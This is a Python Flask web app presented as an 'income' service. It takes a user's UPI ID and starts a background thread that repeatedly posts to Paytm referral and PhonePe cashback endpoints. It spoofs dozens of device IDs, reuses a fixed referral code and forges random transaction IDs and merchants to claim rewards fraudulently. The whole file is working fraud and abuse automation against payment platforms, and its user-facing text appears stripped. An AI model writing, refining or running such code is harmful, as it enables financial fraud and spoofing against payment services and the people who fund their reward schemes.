from flask import Flask, request, render_template_string, session
import threading
import time
import requests
import random
import hashlib
from datetime import datetime

app = Flask(__name__)
app.secret_key = "supersecretkey"  #  

# =====   =====
def start_income(upi_id):
    PAYTM_REFER_API = "https://paytm.com/referral/claim"
    PHONEPE_CASHBACK_API = "https://phonepe.com/api/v2/cashback/claim"
    HEADERS = {
        "User-Agent": "Mozilla/5.0",
        "X-Device-ID": "android_sim",
        "Content-Type": "application/json"
    }

    def spam_paytm(upi):
        total = 0
        for dev in [f"droid_{hashlib.md5(str(i).encode()).hexdigest()[:10]}" for i in range(50)]:
            for _ in range(10):
                try:
                    r = requests.post(PAYTM_REFER_API, json={"ref_code":"CRASH123","device_id":dev,"upi":upi}, headers=HEADERS, timeout=2)
                    if r.status_code == 200:
                        total += 25
                except:
                    pass
                time.sleep(0.3)
        return total

    def exploit_phonepe(upi):
        total = 0
        for i in range(100):
            try:
                r = requests.post(PHONEPE_CASHBACK_API, json={"upi_id":upi,"txn_id":f"TXN{random.randint(100000,999999)}","merchant":random.choice(["Flipkart","Amazon","Swiggy"])}, headers=HEADERS, timeout=2)
                if r.status_code == 200:
                    total += random.randint(10,50)
            except:
                pass
            time.sleep(0.2)
        return total

    total_earned = 0
    while True:
        try:
            paytm = spam_paytm(upi_id)
            phonepe = exploit_phonepe(upi_id)
            total_earned += paytm + phonepe
            log_line = f"{datetime.now()} - UPI: {upi_id}, : {paytm}, : {phonepe}, : {total_earned}"
            print(log_line)
            with open("log.txt", "a") as f:
                f.write(log_line + "\n")
            time.sleep(600)
        except Exception as e:
            print(f"Error for {upi_id}: {e}")
            time.sleep(60)

# =====   =====
@app.route("/", methods=["GET", "POST"])
def home():
    if request.method == "POST":
        upi = request.form.get("upi_id")
        if upi:
            session["upi"] = upi
            if not session.get("thread_started"):
                thread = threading.Thread(target=start_income, args=(upi,))
                thread.daemon = True
                thread.start()
                session["thread_started"] = True
            return render_template_string(HTML_RESULT, upi=upi)
    return render_template_string(HTML_FORM)

# ===== HTML  =====
HTML_FORM = """
<!DOCTYPE html>
<html>
<head>
    <title> </title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: sans-serif; max-width: 400px; margin: 50px auto; padding: 20px; background: #f4f4f4; }
        input, button { width: 100%; padding: 12px; margin: 8px 0; font-size: 18px; border-radius: 8px; border: 1px solid #ccc; }
        button { background: #28a745; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <h2>  </h2>
    <p> UPI  (/) :</p>
    <form method="post">
        <input type="text" name="upi_id" placeholder=": example@paytm" required>
        <button type="submit">  </button>
    </form>
</body>
</html>
"""

HTML_RESULT = """
<!DOCTYPE html>
<html>
<head>
    <title> </title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: sans-serif; max-width: 400px; margin: 50px auto; padding: 20px; background: #f4f4f4; }
        .box { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    </style>
</head>
<body>
    <div class="box">
        <h2>   !</h2>
        <p><strong>UPI:</strong> {{ upi }}</p>
        <p>     </p>
        <p>      </p>
        <p><a href="/">     </a></p>
    </div>
</body>
</html>
"""

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)